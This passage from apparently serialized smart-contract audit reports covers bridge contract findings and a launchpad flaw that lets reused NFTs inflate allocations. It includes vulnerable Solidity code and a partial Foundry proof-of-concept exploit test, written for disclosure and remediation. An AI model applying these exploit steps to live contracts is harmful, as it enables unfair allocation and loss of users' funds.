vulnerability in this approach is that the ZToken is created by default with 18 decimals, whereas the BRC token could have different amount of decimals.\r\n\r\nAs a consequence, when the user burns his ZTokens, he would be eligible for more/less tokens if the BRC tokens are different.\r\n\r\nConsider the following scenario:\r\n\r\nThere\'s an BRC20 with the following properties:\r\n\r\n```\r\n"p": ...,\r\n"op": ...,\r\n"tick": "b032",\r\n"max": ...\r\n"dec": 8\r\n```\r\n\r\nThen Amelie wants to swap some `b032`, hence the admins call`addMintERCEntries` for b032 tick with 1e8 as amount. However, when the user claims it through `claimERCEntryForWallet` he will receive ZUTToken in 1e18.\r\n\r\nThe problem is, that when Amelie decides to swap back for `b032`, she would be getting the amount in 18 decimals instead of 8 decimals.\r\n\r\n```solidity\r\n    function burnERCTokenForBRC(\r\n        string calldata ticker,\r\n        uint256 amount,\r\n        string calldata btcAddress,\r\n        string calldata meta\r\n    ) external payable nonReentrant whenNotPaused {\r\n\r\n        string memory uppercaseTicker = uppercase(ticker);\r\n        require(msg.value == BURN_ETH_FEE, "Incorrect fee");\r\n        // solhint-disable-next-line\r\n        feeRecipient.call{ value: BURN_ETH_FEE }("");\r\n        require(tokenContracts[uppercaseTicker] != address(0), "Invalid ticker");\r\n\r\n        ZUTToken(tokenContracts[uppercaseTicker]).burnFrom(msg.sender, amount);\r\n\r\n        uint256 id = burnForBRCEntries.length;\r\n        burnForBRCEntries.push(BurnForBRCEntry(id, uppercaseTicker, msg.sender, amount, btcAddress, meta, false));\r\n\r\n        emit BurnForBRCEntryAdded(uppercaseTicker, msg.sender, btcAddress, id, amount, meta);\r\n    }\r\n```\r\n\r\nAs a result, her exchange ratio will be heavily inflated\r\n\r\n**Recommendation:** To address the vulnerability and ensure accurate token exchange ratios, the following recommendations are provided:\r\n\r\n1. Modify the `claimERCEntryForWallet` function to retrieve the decimal precision of the BRC token associated with the ticker. This can be achieved by adding a mapping or storage to keep track of the decimal precision for each BRC token.\r\n\r\n```solidity\r\n// Add a mapping to store decimal precision for each BRC token\r\nmapping(string => uint8) public brcTokenDecimalPrecision;\r\n```\r\n\r\n2. Use the obtained decimal precision to initialize the ZToken (ERC) with the correct decimal precision when creating a new token in the `claimERCEntryForWallet` function. This ensures that the ZToken aligns with the intended precision of the BRC token.\r\n\r\n```solidity\r\n// Set the decimal precision of the ZToken based on the BRC token\r\nuint8 decimalPrecision = brcTokenDecimalPrecision[uppercaseTicker];\r\nZUTToken token = new ZUTToken(uppercaseTicker, decimalPrecision);\r\n```\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Risk of funds getting stuck due to unchecked result of fee recipient call\r\n\r\n**Context:** [TokenFactory.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/TokenFactory.sol#L195-L214)\r\n\r\n**Impact:** This vulnerability exposes the smart contract to a potential loss of funds. If the `feeRecipient.call` statement in the `burnERCTokenForBRC` function returns `false`, the function will proceed with the execution without paying the fee recipient. As a result, the `BURN_ETH_FEE` will remain in the contract indefinitely and become irretrievable.\r\n\r\n**Description:** When burning ERC for BRC, there\'s a fee that is due to the fee recipient. The vulnerability lies in the lack of validation for the result of the `feeRecipient.call` function call. The code does not check whether the call was successful or if it returns `false`. Consequently, even if the call fails, the function execution continues, allowing the contract to proceed without paying the fee recipient.\r\n\r\nIn 99% of the cases, this would be a minor issue, but what makes it a medium is that if this happens `BURN_ETH_FEE` won\'t be retrievable and will be forever stuck in the contract.\r\n\r\n```solidity\r\n function burnERCTokenForBRC(\r\n        string calldata ticker,\r\n        uint256 amount,\r\n        string calldata btcAddress,\r\n        string calldata meta\r\n    ) external payable nonReentrant whenNotPaused {\r\n\r\n        string memory uppercaseTicker = uppercase(ticker);\r\n        require(msg.value == BURN_ETH_FEE, "Incorrect fee");\r\n        // solhint-disable-next-line\r\n        feeRecipient.call{ value: BURN_ETH_FEE }("");\r\n        require(tokenContracts[uppercaseTicker] != address(0), "Invalid ticker");\r\n\r\n        ZUTToken(tokenContracts[uppercaseTicker]).burnFrom(msg.sender, amount);\r\n\r\n        uint256 id = burnForBRCEntries.length;\r\n        burnForBRCEntries.push(BurnForBRCEntry(id, uppercaseTicker, msg.sender, amount, btcAddress, meta, false));\r\n\r\n        emit BurnForBRCEntryAdded(uppercaseTicker, msg.sender, btcAddress, id, amount, meta);\r\n    }\r\n```\r\n\r\n**Recommendation:** To address this vulnerability, it is recommended to implement proper validation of the result returned by the `feeRecipient.call` statement. By checking the return value, the function can handle cases where the call fails or returns `false`. Below is an updated version of the code with the recommended changes:\r\n\r\n```solidity\r\nfunction burnERCTokenForBRC(\r\n    string calldata ticker,\r\n    uint256 amount,\r\n    string calldata btcAddress,\r\n    string calldata meta\r\n) external payable nonReentrant whenNotPaused {\r\n    string memory uppercaseTicker = uppercase(ticker);\r\n    require(msg.value == BURN_ETH_FEE, "Incorrect fee");\r\n\r\n    // Ensure the fee recipient call is successful\r\n    (bool success, ) = feeRecipient.call{ value: BURN_ETH_FEE }("");\r\n    require(success, "Fee recipient call failed");\r\n\r\n    require(tokenContracts[uppercaseTicker] != address(0), "Invalid ticker");\r\n\r\n    ZUTToken(tokenContracts[uppercaseTicker]).burnFrom(msg.sender, amount);\r\n\r\n    uint256 id = burnForBRCEntries.length;\r\n    burnForBRCEntries.push(BurnForBRCEntry(id, uppercaseTicker, msg.sender, amount, btcAddress, meta, false));\r\n\r\n    emit BurnForBRCEntryAdded(uppercaseTicker, msg.sender, btcAddress, id, amount, meta);\r\n}\r\n\r\n```\r\n\r\n### [M-2] Lack of validation for duplicate transaction IDs in addMintERCEntries function\r\n\r\n**Context:** [TokenFactory.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/TokenFactory.sol#L246-L270)\r\n\r\n**Impact:** The lack of validation for duplicate transaction IDs in the `addMintERCEntries` function can lead to the repeated addition of ERC20 entries with the same `btcTxId` value. This vulnerability can potentially result in the creation of multiple duplicate entries, leading to inaccurate or misleading data within the system. However, since this function is admin-controlled, the impact is rated as medium.\r\n\r\n**Description:** The `addMintERCEntries` function allows owners to add mintable ERC20 entries by providing various parameters, including the `btcTxIds` array. However, the current implementation lacks validation to check if a transaction ID has already been used. This means that the same `btcTxId` can be used multiple times to add ERC20 entries without any restrictions.\r\n\r\n```solidity\r\n function addMintERCEntries(\r\n        string[] calldata requestedBRCTickers,\r\n        uint256[] calldata amounts,\r\n        address[] calldata users,\r\n        string[] calldata btcTxIds\r\n    ) external onlyOwner {\r\n        require(\r\n            requestedBRCTickers.length > 0 &&\r\n                requestedBRCTickers.length == amounts.length &&\r\n                requestedBRCTickers.length == users.length &&\r\n                requestedBRCTickers.length == btcTxIds.length,\r\n            "Invalid params"\r\n        );\r\n        for (uint256 index = 0; index < requestedBRCTickers.length; index++) {\r\n\r\n            string memory uppercaseTicker = uppercase(requestedBRCTickers[index]);\r\n            mintableERCTokens[uppercaseTicker][users[index]] += amounts[index];\r\n            if (brctokenTickerMap[uppercaseTicker] == false) {\r\n                brcTickers.push(uppercaseTicker);\r\n                brctokenTickerMap[uppercaseTicker] = true;\r\n            }\r\n\r\n            emit MintableERCEntryAdded(uppercaseTicker, users[index], amounts[index], btcTxIds[index]);\r\n        }\r\n    }\r\n```\r\n\r\nAs a result, duplicate entries with the same `btcTxId` can be added to the system, potentially causing data integrity issues.\r\n\r\nWithout proper validation, it becomes difficult to differentiate between unique transactions and repeated submissions. This vulnerability can lead to inaccurate reporting, incorrect balance calculations, and confusion regarding the actual state of the system.\r\n\r\n**Recommendation:** To address this vulnerability, it is recommended to implement validation checks to ensure that each `btcTxId` provided in the `addMintERCEntries` function is unique and has not been previously used. This can be achieved by maintaining a mapping or a data structure to store and verify the uniqueness of transaction IDs.\r\n\r\nConsider implementing the following steps to mitigate the vulnerability:\r\n\r\n1. Create a mapping or data structure to store used `btcTxIds` and their corresponding status (e.g., `bool` value indicating whether the ID has been used or not).\r\n2. Before processing each `btcTxId` within the loop, check if it has already been used by querying the mapping or data structure created in the previous step.\r\n3. If the `btcTxId` is found to be already used, skip the entry or raise an error to indicate the duplication. Ensure proper error handling and informative error messages are provided to assist in debugging\r\n4. If the `btcTxId` is unique and has not been used, proceed with adding the ERC20 entry as before.\r\n\r\n```diff\r\n// Define a mapping to store used btcTxIds and their status\r\nmapping(string => bool) private usedBtcTxIds;\r\n\r\nfunction addMintERCEntries(\r\n    string[] calldata requestedBRCTickers,\r\n    uint256[] calldata amounts,\r\n    address[] calldata users,\r\n    string[] calldata btcTxIds\r\n) external onlyOwner {\r\n    require(\r\n        requestedBRCTickers.length > 0 &&\r\n        requestedBRCTickers.length == amounts.length &&\r\n        requestedBRCTickers.length == users.length &&\r\n        requestedBRCTickers.length == btcTxIds.length,\r\n        "Invalid params"\r\n    );\r\n    for (uint256 index = 0; index < requestedBRCTickers.length; index++) {\r\n        string memory uppercaseTicker = uppercase(requestedBRCTickers[index]);\r\n\r\n+        // Check if btcTxId has already been used\r\n+        require(!usedBtcTxIds[btcTxIds[index]], "Duplicate btcTxId");\r\n\r\n+        // Update the mapping to mark the btcTxId as used\r\n+        usedBtcTxIds[btcTxIds[index]] = true;\r\n\r\n        mintableERCTokens[uppercaseTicker][users[index]] += amounts[index];\r\n        if (brctokenTickerMap[uppercaseTicker] == false) {\r\n            brcTickers.push(uppercaseTicker);\r\n            brctokenTickerMap[uppercaseTicker] = true;\r\n        }\r\n\r\n        emit MintableERCEntryAdded(uppercaseTicker, users[index], amounts[index], btcTxIds[index]);\r\n    }\r\n}\r\n```\r\n\r\n## Low Risk\r\n\r\n### [L-1] getBurnForBRCEntriesToProcess wil DoS due to OOG\r\n\r\n**Context:** [TokenFactory.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/TokenFactory.sol#L138-L162)\r\n\r\n**Impact:** The vulnerability in the `getBurnForBRCEntriesCountToProcess` and `getTickersAndTokenAddresses` functions can lead to denial of service (DoS) attacks due to out of gas, rendering these functions and the dependent function `getBurnForBRCEntriesToProcess` unusable.\r\n\r\n**Description:** The issue stems from the unbounded growth of the `burnForBRCEntries` and `brcTickers` arrays. The vulnerable code snippets responsible for the vulnerability are as follows:\r\n\r\n```solidity\r\n           if (brctokenTickerMap[uppercaseTicker] == false) {\r\n                brcTickers.push(uppercaseTicker);\r\n```\r\n\r\n```solidity\r\n        uint256 id = burnForBRCEntries.length;\r\n        burnForBRCEntries.push(BurnForBRCEntry(id, uppercaseTicker, msg.sender, amount, btcAddress, meta, false));\r\n```\r\n\r\nIn the first code snippet, the `brcTickers` array grows without any limits, as it keeps appending values to the end of the array. Similarly, the second code snippet leads to unbounded growth of the `burnForBRCEntries` array.\r\n\r\nAs a consequence, the `getBurnForBRCEntriesCountToProcess` function, which relies on the length of the `burnForBRCEntries` array, will become increasingly inefficient and consume excessive gas as the array grows. This vulnerability not only impacts gas costs but also makes the `getBurnForBRCEntriesToProcess` function, which depends on `getBurnForBRCEntriesCountToProcess`, inoperable due to the increasingly unmanageable arrays.\r\n\r\nThe same vulnerability applies to `checkPendingERCToClaimForWallet` as well\r\n\r\n**Recommendation:** Consider using a circular buffer/mapping or similar data structure to efficiently manage or remove of old entries. This allows for constant-time removal of the oldest entry while maintaining a fixed-size array.',pdfLink:"https://github.com/bytes032/reports/blob/main/OrdBridge.pdf"},{title:"SpartaDEX Launchpad",slug:"sparta-dex",description:"**SpartaDEX** is a combination of real-time strategy game set in the realities of ancient Greece and a decentralized cryptocurrency exchange. They call it a **gamified DEX**. The main goal is to provide the exchange with user engagement known from video games, which builds loyalty and consistency in providing liquidity.\r\n\r\nThis audit is in regards to their 2nd product, called SpartaPad, which gives huge utility to NFT holders and $SPARTA tokens.\r\n\r\nIt's a launchpad on which the users will be able to grab an allocation in top Arbitrum projects.\r\n\r\nIt gives a huge utility to both Revealed Spartans NFTs and SPARTA token holders. Each fundraising will have a dedicated, pre-public round only for NFT holders and WL, where each of the NFTs will translate into a part in the allocation.",findings:6,createdAt:"2023-05-01T03:52:32.356Z",body:'---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] Tokens can be used multiple times for the same fundraiser\r\n\r\n**Context:** [Fundraiser.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/Fundraiser.sol#L277-L303)\r\n\r\n**Impact:** This vulnerability can lead to substantial imbalances in token allocation among users, providing an unfair advantage to those who exploit it.\r\n\r\n**Description:** The function `calculateMaxAllocation` computes the highest allocation a user can obtain, predicated on their deposit amount and the quantity of their valid and invalid NFTs.\r\n\r\nThe base allocation per wallet is the first factor in this calculation: if a user\'s deposit equals or falls short of this figure, the maximum allocation derives from this base plus an additional amount proportionate to the number of valid NFTs.\r\n\r\nFor deposits exceeding the base allocation, the function employs distinct thresholds, taking into account both valid and invalid NFTs.\r\n\r\nWhen the function is first invoked and the user\'s deposit is less than or equal to the `baseAllocationPerWallet`, the maximum allocation calculation is as follows:\r\n\r\n$$ allocation = basePerWallet + (numOfValidNfts \\* allocationPerNft)$$\r\n\r\nShould the deposit exceed the base allocation, the function calculates two thresholds:\r\n\r\n```solidity\r\n  uint256 threshold1 = allocationConfig.baseAllocationPerWallet.add(allocationConfig.nftTicketAllocation);\r\n\r\nuint256 threshold2 = allocationConfig.baseAllocationPerWallet.add(allocationConfig.nftTicketAllocation.mul(2));\r\n\r\n```\r\n\r\nThreshold 1 is supposed to detect if the user deposited 1 nft.\r\nThreshold 2 is supposed to detect i the user deposited 2 nft\'s.\r\n\r\nThreshold 1 and threshold 2 correspond to deposits for one and two NFTs, respectively. The function subsequently uses these thresholds to determine the allowable NFTs for a user.\r\n\r\n```solidity\r\n            // threshold for 1 nft\r\n            if (userDeposit <= threshold1) {\r\n                allowedNfts = invalidNftCount >= 1 ? 1 + validNftCount : validNftCount;\r\n\r\n            // threshold for 2 nft\'s\r\n            } else if (userDeposit <= threshold2) {\r\n                allowedNfts = invalidNftCount >= 2 ? 2 + validNftCount : invalidNftCount == 1 ? validNftCount + 1 : validNftCount;\r\n\r\n            // threshold for 3 nft\'s\r\n            } else {\r\n                allowedNfts = invalidNftCount >= 3 ? 3 : validNftCount + invalidNftCount;\r\n            }\r\n\r\n```\r\n\r\nIf the **current** deposit of the user is below or equal threshold 1\r\n\r\n-   If the user has one or more invalid NFTs (`invalidNftCount >= 1`), they can have a total number of NFTs that equals their number of valid ones plus one more (`1 + validNftCount`).\r\n-   If the user doesn\'t have any invalid NFTs, then they\'re only allowed to have as many NFTs as they have valid ones (`validNftCount`), though the max amount of NFT\'s passed can be no more than 3.\r\n\r\nIf the **current** deposit of the user is below or equal threshold 2:\r\n\r\n-   If the user has two or more invalid NFTs (`invalidNftCount >= 2`), they can have a total number of NFTs equal to their number of valid ones (`validNftCount`) plus two.\r\n-   If the user has exactly one invalid NFT (`invalidNftCount == 1`), they can have a total number of NFTs equal to their number of valid ones plus one.\r\n-   If the user doesn\'t have any invalid NFTs, they can have only the number of valid NFTs they already have (`validNftCount`).\r\n\r\nIf none of the requirements above are met:\r\n\r\n-   If the user has provided three or more invalid NFT\'s, his **allowed** NFT\'s equal 3\r\n-   Otherwise, its the sum of the invalidNftCount and validNftCount\r\n\r\nThe vulnerability here stems from two things:\r\n\r\n1. In the calculation logic, a whitelisted user who deposits an amount that surpasses both `threshold1` and `threshold2` will automatically fall into the third condition, where the allocation calculation does not factor in whether the NFTs are valid or not.\r\n2. As a consequence, users can get NFT\'s from another user which are considered as invalid, but the function will still count them as valid, because it doesn\'t expect the users to have balance above the threshold.\r\n\r\nThe validity and invalidity of NFTs are determined by the function below, enabling users to transfer used (thus invalid) tokens to others, who can then treat them as their own.\r\n\r\n```solidity\r\n    function countValidAndInvalidNfts(address userAddress, uint256[] memory nftIds) private view returns (uint256 validNftCount, uint256 invalidNftCount) {\r\n\r\n        for (uint256 i = 0; i < nftIds.length; i++) {\r\n            uint256 nftId = nftIds[i];\r\n\r\n            if (IERC721(nftToken).ownerOf(nftId) == userAddress) {\r\n                if (!usedNftId[nftId]) {\r\n                    validNftCount++;\r\n                } else {\r\n                    invalidNftCount++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n```\r\n\r\nConsider a scenario involving two users, Amelie and Noemi. Assume the following:\r\n\r\n```\r\nuint256 baseAllocationPerWallet = 50e18;\r\nuint256 maxTotalAllocation = 200e18;\r\nuint256 nftTicketAllocation = 1e18;\r\nuint256 whitelistAllocation = 10e18;\r\n```\r\n\r\n1.  Amelie possesses 3 NFTs and 100 tokens.\r\n2.  Amelie invokes `depositWithNFT(63e18, amelieTokenIds)` with her three NFTs, receiving the maximum allocation permissible by the system.\r\n3.  Amelie\'s tokens are marked as used, rendering them invalid for future use.\r\n4.  Noemi, lacking NFTs, resorts to a standard deposit of up to 60e18.\r\n5.  Cunningly, Noemi requests temporary custody of Amelie\'s used tokens.\r\n6.  Amelie, obliging her friend, transfers her used tokens to Noemi.\r\n7.  Noemi then invokes `depositWithNFT(3e18, amelieTokenIds)`, attaining the maximum allocation permitted by the system, despite not actually owning any NFTs.\r\n\r\nThe following Proof of Concept demonstrates this vulnerability in action:\r\n\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.15;\r\nimport "forge-std/Test.sol";\r\nimport "openzeppelin/contracts/utils/math/SafeMath.sol";\r\nimport "openzeppelin/contracts/token/ERC20/IERC20.sol";\r\nimport "openzeppelin/contracts/token/ERC20/ERC20.sol";\r\nimport "openzeppelin/contracts/access/Ownable.sol";\r\nimport "openzeppelin/contracts/token/ERC721/IERC721.sol";\r\nimport "openzeppelin/contracts/token/ERC721/ERC721.sol";\r\nimport "openzeppelin/contracts/security/Pausable.sol";\r\nimport "openzeppelin/contracts/utils/cryptography/MerkleProof.sol";\r\nimport "openzeppelin/contracts/access/Ownable.sol";\r\nimport "forge-std/Test.sol";\r\n\r\ncontract MockNFT is ERC721 {\r\n    constructor() ERC721("MockNFT", "MNFT") {}\r\n\r\n    function mint(uint256 tokenId) external {\r\n        _mint(msg.sender, tokenId);\r\n    }\r\n}\r\n\r\ncontract MockERC20 is ERC20 {\r\n    constructor() ERC20("MockERC20", "MERC20") {}\r\n\r\n    function mint(uint256 amount) external {\r\n        _mint(msg.sender, amount);\r\n    }\r\n}\r\n\r\n\r\ncontract Fundraiser is Pausable, Ownable {\r\n    using SafeMath for uint256;\r\n    struct TokenConfig {\r\n        address depositToken;\r\n        address factory;\r\n    }\r\n\r\n    struct AllocationConfig {\r\n        uint256 nftTicketAllocation;\r\n        uint256 baseAllocationPerWallet;\r\n        uint256 maxTotalAllocation;\r\n        uint256 rate;\r\n    }\r\n\r\n    struct TimeConfig {\r\n        uint256 nftStartTime;\r\n        uint256 openStartTime;\r\n        uint256 endTime;\r\n        uint256 distributionStartTime;\r\n    }\r\n\r\n    TokenConfig public tokenConfig;\r\n    AllocationConfig public allocationConfig;\r\n    TimeConfig public timeConfig;\r\n    address public nftToken;\r\n    uint256 public whitelistedAllocation;\r\n    uint256 public constant ALLOCATION_DIVIDER = 10000;\r\n\r\n\r\n    mapping(address => uint256) public depositedAmount;\r\n    uint256 public totalDeposited;\r\n    mapping(uint256 => bool) public usedNftId;\r\n\r\n    event Deposit(address indexed user, uint256 amount);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event Claim(address indexed user, uint256 amount);\r\n    event VestingDeployed(address vestingAddress);\r\n    event RegisterWhitelist(bytes32 merkleRoot, uint256 whitelistedAllocation);\r\n\r\n    modifier canDeposit(uint256 _amount) {\r\n        require(_amount > 0, "Fundraiser: deposit amount must be greater than 0");\r\n        require(block.timestamp <= timeConfig.endTime, "Fundraising has already ended");\r\n        require(totalDeposited.add(_amount) <= allocationConfig.maxTotalAllocation, "Max total allocation reached");\r\n        _;\r\n    }\r\n\r\n    error TransferFailed();\r\n\r\n    constructor(\r\n        address _depositToken,\r\n        uint256 _baseAllocationPerWallet,\r\n        uint256 _maxTotalAllocation,\r\n        uint256 _nftTicketAllocation,\r\n        uint256 _nftFundraiseStartTime,\r\n        uint256 _openFundraiseStartTime,\r\n        uint256 _fundraiseEndTime,\r\n        address _owner,\r\n        address _nftToken\r\n    ) {\r\n        tokenConfig.depositToken = _depositToken;\r\n        allocationConfig.baseAllocationPerWallet = _baseAllocationPerWallet;\r\n        allocationConfig.maxTotalAllocation = _maxTotalAllocation;\r\n        allocationConfig.nftTicketAllocation = _nftTicketAllocation;\r\n        timeConfig.nftStartTime = _nftFundraiseStartTime;\r\n        timeConfig.openStartTime = _openFundraiseStartTime;\r\n        timeConfig.endTime = _fundraiseEndTime;\r\n        nftToken = _nftToken;\r\n        _transferOwnership(_owner);\r\n    }\r\n\r\n\r\n    function depositWithWhitelist(uint256 _amount) external whenNotPaused canDeposit(_amount) {\r\n        require(block.timestamp >= timeConfig.nftStartTime, "Fundraising has not started yet");\r\n\r\n        // require(MerkleProof.verify(proof_, merkleRoot, keccak256(abi.encodePacked(msg.sender))), "User is not whitelisted.");\r\n\r\n        uint256 userDeposit = depositedAmount[msg.sender];\r\n\r\n        require(_amount.add(userDeposit) <= whitelistedAllocation.add(allocationConfig.baseAllocationPerWallet), "Whitelist max allocation overflow");\r\n        if (\r\n            !IERC20(tokenConfig.depositToken).transferFrom(msg.sender, address(this), _amount)\r\n        ) {\r\n            revert TransferFailed();\r\n        }\r\n        depositedAmount[msg.sender] = depositedAmount[msg.sender].add(_amount);\r\n        totalDeposited = totalDeposited.add(_amount);\r\n\r\n        emit Deposit(msg.sender, _amount);\r\n    }\r\n\r\n    function depositWithWhitelistAndNft(uint256 _amount, uint256[] memory nftIds) external whenNotPaused canDeposit(_amount) {\r\n        require(block.timestamp >= timeConfig.nftStartTime, "Fundraising has not started yet");\r\n\r\n        require(nftIds.length <= 3, "Max nftIds is 3");\r\n        require(nftIds.length >= 1, "Min nftIds is 1");\r\n\r\n        // require(MerkleProof.verify(proof_, merkleRoot, keccak256(abi.encodePacked(msg.sender))), "User is not whitelisted.");\r\n\r\n        uint256 userDeposit = depositedAmount[msg.sender];\r\n\r\n        (uint256 validNftCount, uint256 invalidNftCount) = countValidAndInvalidNfts(msg.sender, nftIds);\r\n        uint256 nftMaxAllocation = calculateMaxAllocation(userDeposit, validNftCount, invalidNftCount);\r\n\r\n        require(userDeposit.add(_amount) <= nftMaxAllocation.add(whitelistedAllocation), "Max whitelisted and nft allocation overflow");\r\n\r\n        for (uint256 i = 0; i < nftIds.length; i++) {\r\n            uint256 nftId = nftIds[i];\r\n\r\n            if (IERC721(nftToken).ownerOf(nftId) == msg.sender && !usedNftId[nftId]) {\r\n                usedNftId[nftId] = true;\r\n            }\r\n        }\r\n\r\n        if (\r\n            !IERC20(tokenConfig.depositToken).transferFrom(msg.sender, address(this), _amount)\r\n        ) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        depositedAmount[msg.sender] = depositedAmount[msg.sender].add(_amount);\r\n        totalDeposited = totalDeposited.add(_amount);\r\n\r\n        // emit Deposit(msg.sender, _amount);\r\n    }\r\n\r\n    function setWhitelist(uint256 _whitelistedAllocation) external onlyOwner {\r\n\r\n        whitelistedAllocation = _whitelistedAllocation;\r\n        // merkleRoot = _merkleRoot;\r\n        // emit RegisterWhitelist(_whitelistedAllocation);\r\n    }\r\n\r\n    function useAllocationWithNfts(uint256[] memory nftIds, uint256 additionalDeposit) private {\r\n        // Currently deposited amount\r\n        uint256 userDeposit = depositedAmount[msg.sender];\r\n\r\n        // validNftCount = number of valid nfts that are owned by the address and are not used yet\r\n        // invalidNftCount = reverse of validNftCount\r\n        (uint256 validNftCount, uint256 invalidNftCount) = countValidAndInvalidNfts(msg.sender, nftIds);\r\n        uint256 maxAllocation = calculateMaxAllocation(userDeposit, validNftCount, invalidNftCount);\r\n\r\n        require(userDeposit.add(additionalDeposit) <= maxAllocation, "Max allocation overflow");\r\n\r\n        for (uint256 i = 0; i < nftIds.length; i++) {\r\n            uint256 nftId = nftIds[i];\r\n            // cannot share nftIds between users, because nftId is used to compare\r\n            if (IERC721(nftToken).ownerOf(nftId) == msg.sender && !usedNftId[nftId]) {\r\n                usedNftId[nftId] = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    function countValidAndInvalidNfts(address userAddress, uint256[] memory nftIds) private view returns (uint256 validNftCount, uint256 invalidNftCount) {\r\n\r\n        for (uint256 i = 0; i < nftIds.length; i++) {\r\n            uint256 nftId = nftIds[i];\r\n\r\n            if (IERC721(nftToken).ownerOf(nftId) == userAddress) {\r\n                if (!usedNftId[nftId]) {\r\n                    validNftCount++;\r\n                } else {\r\n                    invalidNftCount++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // if you hold NFT\'s, you can deposit beyond the limit of the base allocation per wallet\r\n    function calculateMaxAllocation(uint256 userDeposit, uint256 validNftCount, uint256 invalidNftCount) private view returns (uint256) {\r\n        uint256 maxAllocation;\r\n        uint256 allowedNfts;\r\n\r\n        if (userDeposit <= allocationConfig.baseAllocationPerWallet) {\r\n            // @audit-info the user has exercised on 100% his "erc20 deposit allocation"\r\n            // or the user has not deposited at all yet\r\n\r\n            // the maximum allocation is based on the\r\n            // maximum per wallet + the valid nft\'s * the allocation per nft\r\n            maxAllocation = allocationConfig.baseAllocationPerWallet.add(validNftCount.mul(allocationConfig.nftTicketAllocation));\r\n        } else {\r\n\r\n            // @audit-info when trying to deposit more than the base allocation per wallet\r\n\r\n            uint256 threshold1 = allocationConfig.baseAllocationPerWallet.add(allocationConfig.nftTicketAllocation);\r\n\r\n            uint256 threshold2 = allocationConfig.baseAllocationPerWallet.add(allocationConfig.nftTicketAllocation.mul(2));\r\n\r\n            // this here practically means that if a user has already deposited with 1 valid nft\r\n            // on the next transaction he has to provide 1 invalid and 2 valids to get the maximum allocation\r\n\r\n            // threshold for 1 nft\r\n            if (userDeposit <= threshold1) {\r\n                allowedNfts = invalidNftCount >= 1 ? 1 + validNftCount : validNftCount;\r\n\r\n            // threshold for 2 nft\'s\r\n            } else if (userDeposit <= threshold2) {\r\n                allowedNfts = invalidNftCount >= 2 ? 2 + validNftCount : invalidNftCount == 1 ? validNftCount + 1 : validNftCount;\r\n\r\n            // threshold for 3 nft\'s\r\n            } else {\r\n                allowedNfts = invalidNftCount >= 3 ? 3 : validNftCount + invalidNftCount;\r\n            }\r\n\r\n            // the maximum allocation based on the\r\n            // maximum per wallet + the nft threshold * the allocation per nft\r\n\r\n            // if the user doesn\'t provide at least 1 invalid nft, the max allocation\r\n            // equals the base allocation per wallet\r\n            maxAllocation = allocationConfig.baseAllocationPerWallet.add(allowedNfts.mul(allocationConfig.nftTicketAllocation));\r\n        }\r\n\r\n        // total deposited by everybody so far + the maximum allocation for this deposit\r\n        uint256 currentTotal = totalDeposited.add(maxAllocation);\r\n        if (currentTotal > allocationConfig.maxTotalAllocation) {\r\n\r\n            // if the current total is bigger, the maximum allocation is\r\n            // the difference between the max and the total deposited\r\n            return allocationConfig.maxTotalAllocation.sub(totalDeposited);\r\n        }\r\n\r\n        return maxAllocation;\r\n    }\r\n\r\n    function checkUsed(uint256[] memory nftIds) external view returns (uint256[] memory) {\r\n        uint256[] memory validNfts = new uint256[](nftIds.length);\r\n\r\n        uint256 validCount = 0;\r\n        for (uint256 i = 0; i < nftIds.length; i++) {\r\n            uint256 nftId = nftIds[i];\r\n            if (!usedNftId[nftId]) {\r\n                validNfts[validCount] = nftId;\r\n                validCount++;\r\n            }\r\n        }\r\n\r\n        uint256[] memory result = new uint256[](validCount);\r\n        for (uint256 i = 0; i < validCount; i++) {\r\n            result[i] = validNfts[i];\r\n        }\r\n\r\n        return result;\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract Test30 is Test {\r\n  using SafeMath for uint256;\r\n  Fundraiser fundraiser;\r\n  MockERC20 token;\r\n  MockNFT nft;\r\n\r\n  address amelie = makeAddr("amelie");\r\n  address noemi = makeAddr("noemi");\r\n  uint256 baseAllocationPerWallet = 50e18;\r\n  uint256 maxTotalAllocation = 200e18;\r\n  uint256 nftTicketAllocation = 1e18;\r\n  uint256 whitelistAllocation = 10e18;\r\n\r\n  function setUp() public {\r\n    vm.createSelectFork("https://eth.llamarpc.com/rpc/01GYVK2PRR9PG6E3KP7P8DSEFX");\r\n    token = new MockERC20();\r\n    nft = new MockNFT();\r\n\r\n    fundraiser = new Fundraiser(address(token), baseAllocationPerWallet, maxTotalAllocation, nftTicketAllocation, block.timestamp, block.timestamp, block.timestamp + 1 days, address(this), address(nft));\r\n    fundraiser.setWhitelist(whitelistAllocation);\r\n  }\r\n\r\n  function test_whiteListedCanUseInvalidNFT() external {\r\n\r\n    // Amelie has 3 NFT\'s and 100 tokens\r\n    vm.startPrank(amelie);\r\n    uint256[] memory amelieTokenIds = new uint256[](3);\r\n    amelieTokenIds[0] = 1;\r\n    amelieTokenIds[1] = 2;\r\n    amelieTokenIds[2] = 3;\r\n\r\n    nft.mint(1);\r\n    nft.mint(2);\r\n    nft.mint(3);\r\n    token.mint(100e18);\r\n\r\n    token.approve(address(fundraiser), 100e18);\r\n    fundraiser.depositWithWhitelistAndNft(63e18, amelieTokenIds);\r\n    assertEq(fundraiser.depositedAmount(amelie) == 63e18, true);\r\n    vm.stopPrank();\r\n\r\n    vm.startPrank(noemi);\r\n\r\n    token.mint(100e18);\r\n    token.approve(address(fundraiser), 100e18);\r\n    fundraiser.depositWithWhitelist(60e18);\r\n    assertEq(fundraiser.depositedAmount(noemi) == 60e18, true);\r\n    vm.stopPrank();\r\n\r\n\r\n    // Noemi borrows tokens from Amelie\r\n    vm.startPrank(amelie);\r\n\r\n    